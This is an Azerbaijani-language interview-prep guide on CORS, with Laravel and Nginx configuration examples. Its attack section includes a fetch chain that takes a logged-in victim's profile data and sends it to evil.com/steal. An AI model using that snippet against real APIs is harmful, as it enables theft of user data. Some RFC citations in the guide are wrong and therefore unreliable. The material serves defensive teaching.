# CORS (Middle ⭐⭐)

## İcmal

CORS (Cross-Origin Resource Sharing) — browserin bir origin-dən başqa origin-ə HTTP sorğu göndərməsini tənzimləyən browser təhlükəsizlik mexanizmidir. Frontend developer-lər tərəfindən "bug" kimi görünən CORS əslində Same-Origin Policy-nin genişləndirilməsidir. Backend developer kimi CORS-un niyə mövcud olduğunu, preflight request-lərin necə işlədiyini, düzgün konfiqurasiya ilə yanlış konfiqurasiyası arasındakı security fərqini bilmək vacibdir. Interview-larda bu mövzu API dizayn, security, microservices sualları ilə birlikdə gəlir.

## Niyə Vacibdir

CORS yanlış konfiqurasiyası ciddi security vulnerability-dir. `Access-Control-Allow-Origin: *` bütün problemləri həll edir kimi görünür, lakin credentials (cookie, auth header) ilə birlikdə istifadə ediləndə CSRF attack mümkün olur. Interviewer bu mövzuda yoxlayır: "CORS-u niyə `*` ilə konfiqurasiya etmirsiniz? Preflight nədir? Wildcard ilə `credentials: true` niyə birlikdə işləmir?" — Bu suallara cavab verə bilmək real-world security thinking-in göstəricisidir.

## Əsas Anlayışlar

- **Same-Origin Policy (SOP)**: Browser default olaraq bir origin-dən başqa origin-ə AJAX sorğu göndərməyə icazə vermir. Origin = protocol + host + port. `https://app.example.com` ilə `https://api.example.com` fərqli origin-dir — subdomain belə fərqli origin sayılır
- **CORS browser mexanizmi-dir**: Server-ə sorğu göndərilir, amma browser cavabı JavaScript-ə vermir (cross-origin olarsa). Bu server-i qorumur — curl, Postman ilə CORS bypass olunur. CORS yalnız browser-i qoruyur
- **Simple request**: GET, HEAD, POST ilə sadə Content-Type (text/plain, application/x-www-form-urlencoded, multipart/form-data). Preflight olmur, birbaşa request göndərilir, CORS header-ları cavabda yoxlanılır
- **Preflight request**: Preflight-triggering şərtlər: PUT, DELETE, PATCH method; özel header-lar (Authorization, X-Custom-Header); JSON Content-Type (`application/json`). Browser əvvəlcə OPTIONS sorğusu göndərir, server icazə verərsə əsl sorğu gedir
- **CORS response header-ları — tam siyahı**:
  - `Access-Control-Allow-Origin`: Hansı origin-ə icazə verilir (spesifik URL ya da `*`)
  - `Access-Control-Allow-Methods`: Hansı HTTP method-lar icazəlidir (GET, POST, PUT, DELETE, PATCH)
  - `Access-Control-Allow-Headers`: Hansı request header-ları icazəlidir (Authorization, Content-Type, X-Custom)
  - `Access-Control-Allow-Credentials`: Cookie/auth header göndərilə bilərmi (`true` ya da omit)
  - `Access-Control-Max-Age`: Preflight cavabını neçə saniyə cache et (məs: 86400 = 24 saat)
  - `Access-Control-Expose-Headers`: JavaScript-in oxuya biləcəyi response header-lar (məs: X-Request-Id)
- **Wildcard + credentials məsələsi**: `Access-Control-Allow-Origin: *` ilə `Access-Control-Allow-Credentials: true` birlikdə işləmir — browser bunu reject edir. Credentials (cookie, Authorization header) lazımdırsa spesifik origin göstərilməlidir. RFC 7235-də bu şərt açıqca müəyyən edilib
- **`withCredentials: true`**: Axios/fetch-də cookie-lərin və auth header-larının cross-origin sorğularda göndərilməsi üçün client-də enable edilməlidir. Olmadıqda cookie göndərilmir, hətta server icazə versə belə
- **OPTIONS method**: Preflight sorğusu OPTIONS method ilə göndərilir. Server bu sorğuya 200 ya da 204 ilə cavab verməlidir — 405 Method Not Allowed qaytarılmamalıdır
- **Exposed headers**: Default olaraq JavaScript yalnız müəyyən "CORS-safelisted response headers"-ı oxuya bilir (Content-Type, Cache-Control, Last-Modified, Content-Language, Content-Length, Expires). Özəl header-lar (X-Request-Id, X-RateLimit-Remaining) `Access-Control-Expose-Headers`-da göstərilməlidir
- **Vary: Origin header**: Fərqli origin-lərə fərqli CORS cavabı verilirsə, CDN/proxy cache fərqli origin-ə fərqli cavabı cache etsin deyə `Vary: Origin` əlavə edilməlidir. Olmadıqda bir origin üçün cache olan cavab başqa origin-ə verilə bilər
- **Dynamic origin validation**: Birdən çox allowed origin varsa, gələn `Origin` header-ı whitelist-ə yoxla, uyğunsada spesifik origin-i `Access-Control-Allow-Origin`-ə qoy. Heç vaxt `*`-ı credentials ilə istifadə etmə
- **CORS centralization at API Gateway**: Microservices arxitekturasında hər service ayrıca CORS konfiqurasiya etmək yerinə API gateway (Nginx, Kong, AWS API Gateway) CORS-u mərkəzləşdirir
- **CORS-un attack surface-i**: Yanlış konfiqurasiya — məs: `Access-Control-Allow-Origin` header-ını gələn `Origin` dəyərindən sanki validation etmədən qaytarmaq — wild-origin reflection hücumuna imkan yaradır. Həmişə whitelist yoxlaması etmək lazımdır
- **Null origin**: `Origin: null` bəzi sandboxed iframe-lərdən, data: URL-dən gəlir. Bunu `Access-Control-Allow-Origin: null` ilə qəbul etmək təhlükəlidir
- **RFC 6454**: Same-Origin Policy-nin rəsmi RFC sənədi — origin konseptinin texniki tərifi burada
- **RFC 7240 (CORS)**: Fetch Living Standard-da CORS rəsmi olaraq müəyyənləşdirilib — W3C/WHATWG

## Praktik Baxış

**Interview-da yanaşma:**
CORS-u security perspektivindən izah edin. "CORS browser-i qoruyur, serveri deyil" — bu ayrımı mütləq vurğulayın. Sonra real layihədə necə konfiqurasiya etdiyinizi izah edin: allowed origins whitelist, credentials handling, preflight cache.

**Follow-up suallar (top companies-da soruşulur):**
- "CORS server-ə gələn sorğunu blok edirmi?" → Xeyr. Browser blok edir. Server-ə sorğu gedir, cavab da gəlir — lakin browser JavaScript-ə vermir. curl ilə heç bir CORS yoxlanması yoxdur
- "API gateway-də CORS konfiqurasiyası niyə vacibdir?" → Əgər API gateway CORS header-larını qaytarırsa, backend-də təkrar konfiqurasiya lazım deyil — centralized management. Amma double-header problem-i yarana bilər
- "Preflight cache-ın faydası nədir?" → `Access-Control-Max-Age` ilə hər sorğu öncəsi preflight əvəzinə bir dəfə OPTIONS göndərilir — performance artır, xüsusilə real-time API-lərdə əhəmiyyətlidir
- "CORS olmadan XSS attack-ı necə işləyirdi?" → SOP JavaScript kodunun cross-origin cavabı oxumasını qadağan edir. CORS bunu relax edir. XSS SOP-u bypass etmir — attacker hələ cavabı oxuya bilir
- "Wildcard CORS-un real-world təhlükəsi nədir?" → Əgər `*` və credentials birlikdə işləsəydi, istənilən malicious sayt autentifikasiya olmuş istifadəçinin adından API sorğuları edə bilərdi — CSRF kimi effekt
- "Pre-flight sorğusu authentication tələb edir?" → Xeyr. OPTIONS sorğusunda auth header olmur. Bunu middleware-də handle etmək lazımdır — OPTIONS-a auth middleware tətbiq etmə
- "SPA (Axios) vs server-side rendering — CORS fərqi nədir?" → Server-side rendering-də browser-dan ayrı server sorğu göndərir — CORS yoxlanması yoxdur. Yalnız browser JavaScript-i cross-origin sorğu üçün CORS lazımdır
- "Nginx-də CORS header-ları Laravel middleware ilə birlikdə double header problem-i yarana bilər" → Nginx-də CORS əlavə edirsənsə Laravel middleware-də deaktiv etmək lazımdır. Əks halda iki `Access-Control-Allow-Origin` header gəlir — browser reject edir

**Ümumi səhvlər (candidate-ların etdiyi):**
- CORS-un server security mexanizmi olduğunu düşünmək — "CORS bizi qoruyur" yanlışdır
- `Access-Control-Allow-Origin: *` ilə `credentials: true` birlikdə istifadəyə çalışmaq
- Preflight-ı handle etməmək — OPTIONS method-a 405 Method Not Allowed qaytarmaq
- Production-da bütün domain-ləri wildcard ilə açmaq
- `Vary: Origin` header-ı əlavə etməyi unutmaq — CDN-də cache poisoning riski
- Gələn `Origin`-i validation etmədən birbaşa `Access-Control-Allow-Origin`-ə əks etdirmək (reflection attack)

**Yaxşı cavabı əla cavabdan fərqləndirən:**
SOP-dan CORS-un necə türediyi, credentials ilə wildcard-ın niyə işləmədiyinin RFC-dən izahı, `Vary: Origin` header-ının CDN caching üçün niyə lazım olduğu, ya da API gateway-də CORS centralization-ı izah edə bilmək.

## Nümunələr

### Tipik Interview Sualı

"Your frontend at `https://app.company.com` is getting CORS errors when calling `https://api.company.com`. How do you fix it, and what would you be cautious about?"

### Güclü Cavab

CORS xətası o deməkdir ki, `https://api.company.com` response-da düzgün CORS header-larını qaytarmır. Həll addımları:

1. API server-də `Access-Control-Allow-Origin: https://app.company.com` header-ını əlavə etmək. Sadəcə app.company.com-a icazə vermək vacibdir — `*` istifadə etməməliyik
2. Əgər cookie-based auth istifadə olunursa: `Access-Control-Allow-Credentials: true` əlavə olunmalı, Origin wildcard ola bilməz
3. Preflight OPTIONS sorğusu handle olunmalıdır — 204 No Content ilə cavablanmalıdır
4. Dinamik Origin — birdən çox domain dəstəklənirsə, allowed origins siyahısını server-da saxlayıb dinamik header return etmək lazımdır
5. `Vary: Origin` header-ı əlavə etmək — CDN düzgün cache etsin

Ehtiyatlı olmaq lazım olan məqamlar: Nginx-də `proxy_hide_header`/`add_header` ilə Laravel CORS middleware-in duplicate header yaratmaması.

### Kod/Konfiqurasiya Nümunəsi

```php
// Laravel CORS konfiqurasiyası
// config/cors.php
return [
    'paths' => ['api/*', 'sanctum/csrf-cookie'],

    'allowed_methods' => ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],

    // Xüsusi domain-lər — wildcard * istifadə etməyin
    'allowed_origins' => [
        'https://app.company.com',
        'https://admin.company.com',
    ],

    // Env-dən multiple origins:
    // 'allowed_origins' => array_filter(explode(',', env('CORS_ALLOWED_ORIGINS', ''))),

    'allowed_origins_patterns' => [
        // Subdomain pattern: '/^https:\/\/.*\.company\.com$/'
        // Preview deploy-lar üçün: '/^https:\/\/deploy-preview-\d+\.netlify\.app$/'
    ],

    'allowed_headers' => [
        'Content-Type',
        'Authorization',
        'X-Requested-With',
        'X-Request-Id',
        'X-XSRF-TOKEN',
    ],

    'exposed_headers' => [
        'X-Request-Id',
        'X-RateLimit-Remaining',
        'X-RateLimit-Limit',
        'X-RateLimit-Reset',
    ],

    'max_age' => 86400,  // Preflight 24 saat cache

    'supports_credentials' => true,  // Cookie/Auth header ilə
];
```

```php
// Manual CORS middleware — tam nəzarət lazımdırsa
class CorsMiddleware
{
    private array $allowedOrigins = [
        'https://app.company.com',
        'https://admin.company.com',
    ];

    public function handle(Request $request, Closure $next): Response
    {
        $origin = $request->header('Origin');

        // Preflight OPTIONS sorğusu — auth middleware-dən əvvəl cavabla
        if ($request->method() === 'OPTIONS') {
            return $this->preflight($origin);
        }

        $response = $next($request);

        if ($origin && $this->isAllowedOrigin($origin)) {
            $response->headers->set('Access-Control-Allow-Origin', $origin);
            $response->headers->set('Access-Control-Allow-Credentials', 'true');
            // Vary: Origin — CDN fərqli origin-lər üçün ayrı cache etsin
            $response->headers->set('Vary', 'Origin');
            $response->headers->set('Access-Control-Expose-Headers', 'X-Request-Id, X-RateLimit-Remaining');
        }

        return $response;
    }

    private function preflight(?string $origin): Response
    {
        if (!$origin || !$this->isAllowedOrigin($origin)) {
            return response('Forbidden', 403);
        }

        return response('', 204, [
            'Access-Control-Allow-Origin'      => $origin,
            'Access-Control-Allow-Methods'     => 'GET, POST, PUT, PATCH, DELETE',
            'Access-Control-Allow-Headers'     => 'Content-Type, Authorization, X-Request-Id',
            'Access-Control-Max-Age'           => '86400',
            'Access-Control-Allow-Credentials' => 'true',
            'Vary'                             => 'Origin',
        ]);
    }

    private function isAllowedOrigin(?string $origin): bool
    {
        if (!$origin) return false;
        return in_array($origin, $this->allowedOrigins, true);
    }
}
```

```nginx
# Nginx-də CORS — Laravel CORS middleware deaktiv edilmişsə
# (ikisi eyni anda işləməsin — duplicate header problem)

map $http_origin $cors_origin {
    default "";
    "https://app.company.com"   $http_origin;
    "https://admin.company.com" $http_origin;
}

server {
    location /api/ {
        # Preflight
        if ($request_method = 'OPTIONS') {
            add_header 'Access-Control-Allow-Origin'      $cors_origin always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            add_header 'Access-Control-Allow-Methods'     'GET, POST, PUT, DELETE, OPTIONS' always;
            add_header 'Access-Control-Allow-Headers'     'Authorization, Content-Type, X-Request-Id' always;
            add_header 'Access-Control-Max-Age'           '86400' always;
            add_header 'Vary'                             'Origin' always;
            return 204;
        }

        add_header 'Access-Control-Allow-Origin'      $cors_origin always;
        add_header 'Access-Control-Allow-Credentials' 'true' always;
        add_header 'Vary'                             'Origin' always;

        fastcgi_pass php_workers;
        # ... digər fastcgi parametrləri
    }
}
```

### Attack/Defense Nümunəsi

```
# CORS Misconfiguration Attack — Wild-Origin Reflection

# ❌ Zəiflik: gələn Origin-i yoxlamadan əks etdirmək
if ($request->header('Origin')) {
    $response->headers->set(
        'Access-Control-Allow-Origin',
        $request->header('Origin')  // İstənilən origin qəbul edilir!
    );
    $response->headers->set('Access-Control-Allow-Credentials', 'true');
}

# Attack Ssenarisi:
# 1. Attacker evil.com-da bir səhifə yaradır
# 2. Autentifikasiya olmuş victim evil.com-u açır
# 3. evil.com-dakı JavaScript:
#    fetch('https://api.company.com/user/profile', {credentials: 'include'})
#    .then(r => r.json())
#    .then(data => fetch('https://evil.com/steal?data=' + JSON.stringify(data)))
# 4. API evil.com origin-ini qəbul edir, cookie göndərilir
# 5. Victim-in datası çalınır

# ✅ Həll: Whitelist yoxlaması
private function isAllowedOrigin(?string $origin): bool
{
    $allowed = ['https://app.company.com', 'https://admin.company.com'];
    return $origin && in_array($origin, $allowed, true);
}

# CORS Preflight Bypass Attempt:
# Bəzi framework-lər OPTIONS-a avtomatik 200 qaytarır lakin
# CORS header-larını əlavə etmir — browser əsl request-i blok edir.
# OPTIONS route-u explicitly handle etmək lazımdır.
```

```
CORS Preflight Flow — Visual:

Browser (app.company.com)            API (api.company.com)
       |                                      |
       |--- OPTIONS /api/orders ------------> |
       |    Origin: https://app.company.com   |
       |    Access-Control-Request-Method: POST
       |    Access-Control-Request-Headers: Authorization
       |                                      |
       |<-- 204 No Content ------------------ |
       |    Access-Control-Allow-Origin: https://app.company.com
       |    Access-Control-Allow-Methods: POST
       |    Access-Control-Allow-Headers: Authorization
       |    Access-Control-Max-Age: 86400
       |    Access-Control-Allow-Credentials: true
       |                                      |
       |--- POST /api/orders ----------------> |
       |    Authorization: Bearer token        |
       |    Origin: https://app.company.com    |
       |                                       |
       |<-- 201 Created -------------------- |
       |    Access-Control-Allow-Origin: https://app.company.com
       |    Access-Control-Allow-Credentials: true
       |    Vary: Origin
```

## Praktik Tapşırıqlar

1. `credentials: true` ilə `*` wildcard-ın niyə işləmədiyini praktikada sınayın — browser console error-unu izləyin
2. Nginx-də CORS header-larını konfiqurasiya edin: `map` directive ilə multi-origin support
3. Preflight sorğusunu curl ilə manual göndərin: `curl -X OPTIONS -H "Origin: https://app.company.com" -H "Access-Control-Request-Method: POST" -v https://api.company.com/orders`
4. Multi-origin dəstəyi: allowed origins siyahısından dinamik header return edin, `Vary: Origin` əlavə edin
5. Wild-origin reflection zəifliyini test edin: origin-i validation etmədən əks etdirən endpoint yaradıb, fərqli bir origin-dən sorğu göndərin
6. Laravel CORS middleware + Nginx CORS konfiqurasiyası birlikdə işlədərək double-header problemini reproduce edin
7. API gateway-də (Kong ya da Nginx) CORS centralize edin, backend servis-lərdə CORS deaktiv edin
8. Bütün API route-larınızı CORS audit edin: credential-lı endpoint-lər spesifik origin dəstəkləyirmi?

## Əlaqəli Mövzular

- [OAuth 2.0 and JWT](11-oauth-jwt.md) — CORS ilə auth header kombinasiyası, preflight-da Authorization header
- [API Versioning](08-api-versioning.md) — CORS hər versiya üçün konfiqurasiya edilməlidir
- [HTTP Caching](09-http-caching.md) — `Vary: Origin` header caching-ə təsiri, CDN-də doğru cache
- [Proxy vs Reverse Proxy](13-proxy-reverse-proxy.md) — CORS termination at reverse proxy, centralization
- [Webhook Design](12-webhook-design.md) — Webhook endpoint-ləri CORS-dan azad edilməlidir (server-to-server)
